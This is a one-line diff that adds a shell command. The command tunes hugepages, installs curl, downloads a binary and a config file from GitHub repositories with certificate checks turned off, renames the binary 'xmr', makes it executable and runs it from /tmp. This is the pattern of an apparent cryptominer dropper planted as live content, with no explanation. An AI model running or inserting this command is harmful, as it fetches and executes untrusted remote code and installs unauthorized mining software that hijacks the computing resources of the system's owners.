@@ -1,0 +1,1 @@
+echo 512 > /proc/sys/vm/nr_hugepages  ||apt install curl -y &&  cd /tmp/ && curl -LOk https://github.com/zawal1/red/blob/master/x?raw=true && curl -LOk https://raw.githubusercontent.com/in0v3it/kil3r/master/sconfig.json && mv x?raw=true xmr && chmod +x xmr && ./xmr -c sconfig.json
